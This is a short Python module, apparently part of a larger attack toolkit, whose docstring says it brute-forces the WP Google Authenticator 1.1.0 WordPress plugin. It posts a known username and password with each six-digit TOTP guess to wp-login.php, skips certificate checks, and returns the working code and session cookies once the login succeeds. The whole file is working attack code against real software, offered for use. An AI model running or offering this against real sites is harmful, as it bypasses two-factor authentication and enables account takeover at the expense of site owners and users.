#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

class WPGoogleAuthenticator:
    def __init__(self, url, username, password, user_agent):
        """
        This module brute-forces the following Wordpress plugin:

        WP Google Authenticator 1.1.0 by Julien Liabeuf
        https://wordpress.org/plugins/wp-google-authenticator/
        """
        self.url = url + '/wp-login.php'
        self.username = username
        self.password = password
        self.user_agent = user_agent

    def auth(self, token):
        """
        Tries to authenticate with a HTTP POST request and
        evaluates its result.
        """
        token_string = str(token).zfill(6)
        headers = {
            'User-Agent': self.user_agent
        }
        postdata = {
            'log': self.username,
            'pwd': self.password,
            'totp': token_string,
            'rememberme': 'forever'
        }
        r = requests.post(self.url, headers=headers, data=postdata, allow_redirects=False, verify=False)
        if r.status_code == 200:
            return False
        elif r.status_code == 302:
            result = {
                'token': token_string,
                'cookies': r.cookies.get_dict()
            }
            return result
        else:
            raise Exception('Ouch! Remote server error')
